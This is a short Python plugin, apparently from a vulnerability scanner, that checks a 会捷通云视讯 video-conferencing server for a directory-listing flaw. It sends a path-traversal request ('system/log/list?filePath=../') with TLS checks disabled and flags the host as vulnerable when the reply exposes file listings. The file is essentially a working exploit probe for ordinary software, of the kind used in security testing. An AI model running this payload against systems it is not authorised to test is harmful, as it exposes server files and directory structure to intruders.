#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ["https://peiqi.wgpsec.org/wiki/webapp/%E4%B8%AD%E5%88%9B%E8%A7%86%E8%BF%85/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF%20list%20%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html"]
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "会捷通云视讯 list 目录文件泄露漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/him/api/rest/V1.0/system/log/list?filePath=../"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "list" in res.text and "absolutePath" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret